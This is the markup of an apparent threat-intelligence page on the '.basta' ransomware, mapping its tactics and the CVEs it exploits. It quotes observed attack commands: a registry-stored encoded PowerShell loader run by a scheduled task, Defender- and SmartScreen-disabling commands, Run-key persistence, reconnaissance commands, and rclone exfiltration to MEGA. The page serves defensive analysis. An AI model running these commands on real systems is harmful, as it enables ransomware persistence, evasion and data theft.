				...
				<tr className=''>				
						...
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>buying compromised accounts</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Use powershell and windows command shell</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								...
								<span className='text-gray-900 fw-semibold mb-1 fs-7'>Scheduled Task</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>malicious powershell stored in registry</div>
								</div>
							</div>
						</div>
					</td>          
...
- CVE-2021-42278
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>replace wallpaper, icon, and disable defenses</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Used PsExec, Coroxy, WMI, BITSAdmin</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Uses an established command-and-control (C&C) channel to exfiltrate data.</div>
								</div>
							</div>
						</div>
					</td>          
				...
				<tr className=''>				
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								...
								<span className='text-gray-900 fw-semibold mb-1 fs-7'>Phishing: Spear-phishing attachment</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Mirror technique used by Qakbot</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Rename the "Fax" service to their own encryption service</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								...
								<span className='text-gray-900 fw-semibold mb-1 fs-7'>Group policy modification</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Creation of a GPO, Push out the changes to the Windows registry of domain-joined hosts</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Uses RDP to spread and execute the malware across the network.</div>
								</div>
							</div>
						</div>
					</td>          
				...
				<tr className=''>				
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Used WMI to Spread and execute files over the Network</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							<div className='symbol symbol-50px pb-1'>
								...
								<span className='text-gray-900 fw-semibold mb-1 fs-7'>Disable or modify tools</span>
							</div>
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Disable Windows Defender and Security Center</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Searches for specific files and directories related to its ransomware encryption.</div>
								</div>
							</div>
						</div>
					</td>          
				...
				<tr className=''>				
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Disables Windows recovery and repair features and restarts the machine in safe mode.</div>
								</div>
							</div>
						</div>
					</td>          
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Replaces the desktop wallpaper to display the ransom note</div>
								</div>
							</div>
						</div>
					</td>          
				...
				<tr className=''>				
					...
					<td className='align-items-baseline border-start border-end border-gray-900'>
						<div className='px-2 d-flex flex-column'>
							...
							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
								<div className='text-gray-100 fw-semibold d-block fs-7'>
									<div>Has some builds that are known to use reflective code loading when executing themselves.</div>
								</div>
							</div>
						</div>
					</td>          
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Has been reported buying compromised accounts on underground forums to access victim systems.</div>
			...
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						...
						<span className='text-gray-900 fw-bold mb-1 fs-3'>- Phishing: Spear-phishing attachment</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Mirrors technique used by Qakbot operators to distribute their payload that will deliver the ransomware.</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Uses various scripting interpreters like PowerShell and Windows command shell.</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Stops and deletes the service named “Fax”, which it then impersonates for its encryption routine.</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;sc.exe delete Fax</div>
							<div>&deg;&nbsp;sc.exe create Fax binPath= "#executable_command"</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Has been observed to use Windows Management Instrumentation (WMI) to spread and execute files over the Network.</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;wmic /namespace:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value </div>
							<div>&deg;&nbsp;wmic /namespace:\\root\SecurityCenter2 PATH AntiSpywareProduct GET /value </div>
							<div>&deg;&nbsp;wmic /namespace:\\root\SecurityCenter2 PATH FirewallProduct GET /value </div>
			...
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						...
						<span className='text-gray-900 fw-bold mb-1 fs-3'>- Scheduled Task</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>malicious powershell stored in registry</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;schtasks.exe /Create /F /TN "8884C7DC-A718-48F0-AEB9-36EF8BB22AFC" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\SOFTWARE\Zfoteewsinwbcd).nuwqcgylsfy)))" /SC MINUTE /MO 30 </div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Exploits the PrintNightmare vulnerability</div>
					<div className='fs-2 fw-bold pb-3'>Vulnerability</div>
					<div className='fs-4 fw-semebold pb-5 ms-5 text-gray-900 fst-italic'>
						<div>&deg;&nbsp;CVE-2021-34527 (CVSS:8.8) Microsoft Windows Print Spooler</div>
					
						<div>&deg;&nbsp;CVE-2020-1472 (CVSS:10.0) Netlogon Remote Protocol</div>
					
						<div>&deg;&nbsp;CVE-2021-42287 (CVSS:8.8) Active Directory Domain Services</div>
					
						<div>&deg;&nbsp;CVE-2021-42278 (CVSS:8.8) Active Directory Domain Services</div>
					</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Modifies registry entries to enable it to replace the desktop wallpaper, set the icon associated with encrypted files, establish persistence, and disable defenses.</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #new_executable /f</div>
							<div>&deg;&nbsp;reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f</div>
			...
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						...
						<span className='text-gray-900 fw-bold mb-1 fs-3'>- Group policy modification</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Employs a technique involving the creation of a Group Policy Object (GPO) on a compromised domain controller, which will push out the changes (disable defenses) to the Windows registry of domain-joined hosts.</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force</div>
							<div>&deg;&nbsp;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force</div>
							<div>&deg;&nbsp;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force</div>
							<div>&deg;&nbsp;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force</div>
							<div>&deg;&nbsp;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force</div>
							<div>&deg;&nbsp;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name ShellSmartScreenLevel -Force</div>
			...
			<div className='card card-xl-stretch mb-xl-8'>
				<div className='card-header align-items-center border-0 mt-4'>
					<div className='symbol symbol-50px pb-1'>
						...
						<span className='text-gray-900 fw-bold mb-1 fs-3'>- Disable or modify tools</span>
					</div>
				</div>
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Disable Windows Defender and Security Center</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;powershell -ExecutionPolicy Bypass -command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force" </div>
							<div>&deg;&nbsp;powershell -ExecutionPolicy Bypass -command "Set-MpPreference -DisableRealtimeMonitoring 1" </div>
							<div>&deg;&nbsp;powershell -ExecutionPolicy Bypass Uninstall-WindowsFeature -Name Windows-Defender      </div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Disables Windows recovery and repair features and restarts the machine in safe mode.</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;bcdedit /set default bootMenupolicy legacy</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Has some builds that are known to use reflective code loading when executing themselves. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							...
							<div>&deg;&nbsp;mimiload -consoleoutput -noninteractive</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Used Mimikatz to dumping credentials</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Uses tools for local system scans</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;nc -z -v #ip #port</div>
							<div>&deg;&nbsp;net.exe view /all </div>
							<div>&deg;&nbsp;ipconfig.exe /all </div>
							<div>&deg;&nbsp;arp.exe -a </div>
							<div>&deg;&nbsp;net.exe share </div>
							<div>&deg;&nbsp;nslookup.exe -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.[REDACTED] </div>
							<div>&deg;&nbsp;net.exe localgroup </div>
							<div>&deg;&nbsp;netstat.exe -nao </div>
							<div>&deg;&nbsp;route.exe print </div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Used tools for remote network scans.</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Searches for specific files and directories related to its ransomware encryption.</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Uses tools like PsExec and BITSAdmin to spread the malware laterally across the network.</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Uses RDP to spread and execute the malware across the network.</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;$Server="#logonserver"</div>
							<div>&deg;&nbsp;$User="#username"</div>
							<div>&deg;&nbsp;$Password="#password"</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Uses an established command-and-control (C&C) channel to exfiltrate data.</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Used a tool like Rclone to copy stolen data from a client to its cloud server.</div>
					...
					<div className='mb-5'>
						...
						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>
							<div>&deg;&nbsp;New-Item #rclone_config_path\rclone -ItemType directory</div>
							<div>&deg;&nbsp;New-Item #rclone_config_path\rclone\rclone.conf</div>
							<div>&deg;&nbsp;cd #rclone_path</div>
							<div>&deg;&nbsp;.\rclone.exe config create #remote_share mega</div>
							<div>&deg;&nbsp;set-Content #rclone_config_path\rclone\rclone.conf "#remote_share `n type = mega `n user = #mega_user_accoun `n pass = #mega_user_password"</div>
							<div>&deg;&nbsp;.\rclone.exe copy --max-size 1700k #dir_to_copy #remote_share:test -v</div>
	...
	<div className='row g-5 g-xl-8 pt-4'>
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Delete shadow copies</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Encrypts files and adds the extension ".basta"</div>
					...
					<div className='fs-4 fw-semibold mt-2 mb-2 ms-5 text-gray-900 fst-italic'>.basta</div>
		...
		<div className='col-xl-6'>
			<div className='card card-xl-stretch mb-xl-8'>
				...
				<div className='card-body pt-3'>
					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Replaces the desktop wallpaper to display the ransom note. dlaksjdoiwq.jpg (a desktop wallpaper found in the %TEMP% folder) fkdjsadasd.ico (an icon used for encrypted files, found in the %TEMP% folder)</div>
